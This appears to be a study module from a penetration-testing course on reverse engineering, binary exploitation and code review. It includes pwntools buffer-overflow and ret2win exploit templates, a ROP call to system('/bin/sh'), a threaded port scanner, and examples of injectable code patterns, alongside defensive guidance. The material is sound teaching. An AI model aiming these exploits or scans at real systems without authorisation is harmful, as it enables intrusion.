# Module 10: Tools and Code Analysis

> **Curriculum alignment:** CEH v13 Domain 19 & 20 / CompTIA PenTest+ PT0-003 — Domain 4.0 Reporting and Communication
> **Difficulty:** Advanced
> **Estimated study time:** 7 hours

---

## Overview

This module covers two related disciplines: using and extending the core Kali Linux toolset, and analysing code through reverse engineering and static/dynamic analysis. Topics include writing custom Python and Bash scripts to automate pentesting tasks, reverse engineering binaries with Ghidra, identifying vulnerable patterns in source code reviews, and crafting custom exploits. These skills differentiate advanced practitioners from those who rely solely on automated tools.

---

## Table of Contents

- [Key Concepts](#key-concepts)
- [Methodology / Process](#methodology--process)
- [Tools & Commands](#tools--commands)
- [Attack Techniques (Offensive)](#attack-techniques-offensive)
- [Detection & Defence (Defensive)](#detection--defence-defensive)
- [CTF Tips & Tricks](#ctf-tips--tricks)
- [Common Mistakes](#common-mistakes)
- [Practice Labs](#practice-labs)
- [References](#references)

---

## Key Concepts

### Analysis Types

| Type | Description | When to Use |
|------|-------------|-------------|
| Static Analysis | Examine code or binary without executing it | Malware analysis, code review, reverse engineering |
| Dynamic Analysis | Execute the code and observe runtime behaviour | Debugging, API call tracing, memory analysis |
| Fuzzing | Feed malformed input to find crashes and vulnerabilities | Finding buffer overflows, format string bugs, parser bugs |

### Binary Formats

| Format | Platform | Tool to Analyse |
|--------|----------|----------------|
| ELF | Linux/macOS | `file`, `readelf`, `objdump`, Ghidra |
| PE (.exe/.dll) | Windows | `file`, `CFF Explorer`, Ghidra, IDA |
| Mach-O | macOS | `file`, `otool`, Ghidra |
| APK | Android | `apktool`, `jadx` |
| Bytecode (.class/.pyc) | Java/Python | `javap`, `uncompyle6` |

### Common Vulnerability Patterns in Code

| Pattern | Language | Example |
|---------|----------|---------|
| Buffer overflow | C/C++ | `strcpy(buf, user_input)` without bounds check |
| Format string | C | `printf(user_input)` instead of `printf("%s", user_input)` |
| SQL injection | Any | `query = "SELECT * FROM users WHERE name = '" + name + "'"` |
| Command injection | Any | `os.system("ping " + user_input)` |
| Integer overflow | C/C++ | Arithmetic on unsigned int near MAX_INT |
| Use-after-free | C/C++ | Accessing memory after `free()` |
| Path traversal | Any | `open("files/" + filename)` with no sanitisation |

---

## Methodology / Process

### Reverse Engineering Workflow
1. **File identification** — `file`, `strings`, `hexdump` to identify type and embedded data
2. **Static analysis** — load into Ghidra/IDA, identify functions and control flow
3. **Symbol analysis** — check imports/exports for clues about functionality
4. **String analysis** — find hardcoded credentials, flags, API endpoints
5. **Dynamic analysis** — run under `ltrace`/`strace` or in a debugger (GDB, x64dbg)
6. **Patching** — modify binary or write exploit based on analysis

### Source Code Review Workflow
1. **Scope** — identify the languages, frameworks, and entry points
2. **Dependency scan** — check for known-vulnerable libraries
3. **Taint analysis** — trace user input from source to sink
4. **Dangerous function search** — grep for `system()`, `eval()`, `exec()`, `strcpy()`, `gets()`
5. **Authentication and authorisation review** — check every privilege-sensitive operation
6. **Cryptography review** — identify weak algorithms, hardcoded keys, improper IV/nonce reuse

![RE Workflow](./images/reverse-engineering-workflow.png)
*Figure 1: Binary reverse engineering methodology*

---

## Tools & Commands

### Ghidra

**Purpose:** NSA-developed open-source reverse engineering framework
**Install:** Pre-installed on Kali (`sudo apt install ghidra`) or download from [ghidra-sre.org](https://ghidra-sre.org)

```bash
# Launch Ghidra
ghidra &

# Workflow:
# 1. New Project > Import File
# 2. Double-click the binary to open CodeBrowser
# 3. Auto-Analyse the binary
# 4. Use the Symbol Table to navigate functions
# 5. Decompiler window shows pseudo-C for selected function
```

**Key shortcuts:**
| Shortcut | Action |
|----------|--------|
| `G` | Go to address |
| `L` | Rename symbol |
| `Ctrl+F` | Search for string |
| `F5` | Decompile function |
| `Ctrl+Shift+E` | Search for instruction |

---

### GDB with pwndbg / peda

**Purpose:** Linux binary debugger with enhanced security tooling
**Install:** `sudo apt install gdb pwndbg`

```bash
# Start debugging a binary
gdb ./vulnerable_binary

# Inside GDB:
run                          # run the program
run $(python3 -c 'print("A"*100)')  # run with input
break main                   # set breakpoint at main
break *0x4011a5              # breakpoint at address
info registers               # show register values
x/32wx $rsp                  # examine 32 words at stack pointer
x/s 0x4020a0                 # examine string at address
pattern create 100           # create cyclic pattern (pwndbg)
pattern offset 0x6161616c    # find offset for saved RIP
checksec                     # show binary security properties
```

---

### pwntools

**Purpose:** Python CTF exploit development library
**Install:** `pip install pwntools`

```python
from pwn import *

# Connect to a remote challenge
conn = remote('challenge.ctf.com', 1337)

# Or run a local binary
proc = process('./vulnerable_binary')

# Build a payload
offset = 72
payload = b'A' * offset
payload += p64(0xdeadbeef)  # overwrite RIP

# Send payload
conn.sendlineafter(b'Enter input:', payload)

# Receive output
print(conn.recvall().decode())

# Find string in binary
elf = ELF('./binary')
rop = ROP(elf)
rop.call(elf.plt['system'], [next(elf.search(b'/bin/sh'))])
```

---

### Python Scripting for Pentest Automation

```python
#!/usr/bin/env python3
# Example: Custom port scanner

import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        with socket.create_connection((host, port), timeout=1):
            print(f"[+] {port}/tcp open")
            return port
    except (socket.timeout, ConnectionRefusedError):
        return None

def scan_host(host, ports):
    print(f"Scanning {host}...")
    open_ports = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(host, p), ports)
    return [p for p in results if p]

if __name__ == "__main__":
    host = sys.argv[1]
    ports = range(1, 1025)
    open_ports = scan_host(host, ports)
    print(f"\nOpen ports: {open_ports}")
```

---

### Semgrep — Static Analysis

**Purpose:** Pattern-based static code analysis for security vulnerabilities
**Install:** `pip install semgrep`

```bash
# Scan a Python project for common vulnerabilities
semgrep --config=auto /path/to/project

# Use OWASP ruleset
semgrep --config "p/owasp-top-ten" .

# Scan for SQL injection patterns
semgrep --pattern 'cursor.execute($X + $Y)' --lang python .

# Scan for command injection
semgrep --pattern 'os.system(...)' --lang python .
```

---

## Attack Techniques (Offensive)

### Technique 1: Buffer Overflow (Stack-Based)

**Description:** Overflow a fixed-size stack buffer to overwrite the saved return address and redirect code execution.
**Prerequisites:** Binary without stack canaries (`checksec` shows No canary) and NX disabled or ROP chain available.
**MITRE ATT&CK:** [T1203 — Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203/)

```python
from pwn import *

# 1. Find offset
# Run with cyclic pattern: cyclic(100)
# Crash, read EIP/RIP value
# Run: cyclic_find(0x6161616c) → offset = 72

offset = 72
proc = process('./vuln')
elf = ELF('./vuln')

# 2. Simple ret2win (overwrite RIP with win() address)
win_addr = elf.symbols['win']
payload = b'A' * offset + p64(win_addr)

proc.sendlineafter(b'Input:', payload)
print(proc.recvall())
```

---

### Technique 2: Source Code Review — Finding SQL Injection

**Description:** Manually review source code to identify unsanitised user input passed to SQL queries.
**MITRE ATT&CK:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

```bash
# Search for dangerous SQL concatenation patterns in Python
grep -rn "execute.*+" --include="*.py" .
grep -rn "query.*format\|query.*%" --include="*.py" .

# Search in PHP
grep -rn "mysql_query\|mysqli_query" --include="*.php" .

# Search for raw query construction in Java
grep -rn "createQuery.*\+\|createNativeQuery.*\+" --include="*.java" .

# Semgrep rule for Python SQLi
semgrep --pattern 'db.execute($X + $Y)' --lang python .
```

---

## Detection & Defence (Defensive)

### Secure Coding Practices

**Buffer overflow mitigations:**
- Compile with stack protector: `gcc -fstack-protector-all`
- Enable ASLR: `echo 2 > /proc/sys/kernel/randomize_va_space`
- Mark stack non-executable (NX): enabled by default in modern compilers
- Use memory-safe languages (Rust, Go) for new projects

**Injection prevention:**
- Use parameterised queries for all database interactions
- Validate and sanitise all user input at the boundary
- Apply principle of least privilege to all service accounts
- Integrate SAST (Semgrep, SonarQube, Bandit) into the CI/CD pipeline

**CIS Controls:** CIS Control 16 (Application Software Security), CIS Control 7 (Continuous Vulnerability Management)

---

## CTF Tips & Tricks

- **`file` + `strings` first:** Always run `file <binary>` and `strings <binary> | less` before opening a debugger.
- **`checksec`:** `checksec --file=./binary` — tells you which protections are active before you try any exploit technique.
- **`ltrace` / `strace`:** Shows library calls and system calls at runtime — reveals string comparisons, file reads, and network calls without full RE.
- **Crypto CTFs:** Identify the algorithm first (`Cipher Identifier` at dcode.fr), then look for implementation weaknesses (reused IV, ECB mode, small key size).
- **Rev CTFs:** In Ghidra, rename `FUN_00401234` to descriptive names as you analyse — this dramatically speeds up understanding.
- **Pwntools is your friend:** Use `cyclic()` for offset finding, `p64()`/`p32()` for packing addresses, `ROP()` for building ROP chains.

---

## Common Mistakes

| Mistake | Why it matters | Correct approach |
|---------|---------------|-----------------|
| Running exploit payloads blindly | Payload may differ between local binary and remote challenge | Test locally with identical libc version; use `patchelf` to match |
| Ignoring binary protections | ASLR/PIE requires leak; stack canary requires overwrite technique change | Always run `checksec` before writing any exploit |
| Only doing static analysis | Runtime behaviour differs from what the decompiler shows | Combine static with `ltrace`, `strace`, and GDB dynamic analysis |
| Not checking for outdated libraries | `ldd ./binary` — outdated libc or OpenSSL may have known exploits | Check library versions against CVE databases |

---

## Practice Labs

| Platform | Lab / Room Name | Difficulty | Link |
|----------|----------------|------------|------|
| TryHackMe | Buffer Overflow Prep | Easy | [Link](https://tryhackme.com/room/bufferoverflowprep) |
| TryHackMe | Reverse Engineering | Medium | [Link](https://tryhackme.com/room/reverseengineering) |
| pwn.college | Binary Exploitation | All levels | [Link](https://pwn.college/) |
| picoCTF | Binary Exploitation category | Various | [Link](https://picoctf.org/) |
| HackTheBox | Pwn challenges | Various | [Link](https://www.hackthebox.com) |

---

## References

- [Ghidra SRE](https://ghidra-sre.org/) — Official NSA Ghidra reverse engineering tool
- [pwntools Documentation](https://docs.pwntools.com/) — CTF exploit development library
- [pwn.college](https://pwn.college/) — Free binary exploitation courses
- [GTFOBins](https://gtfobins.github.io/) — Living-off-the-land binary exploitation
- [Exploit Education](https://exploit.education/) — Exploit development practice VMs
- CEH v13 Official Courseware — Module 19 & 20
- CompTIA PenTest+ PT0-003 Study Guide — Chapter 10

---

*Back to [Repository Root](../README.md)*
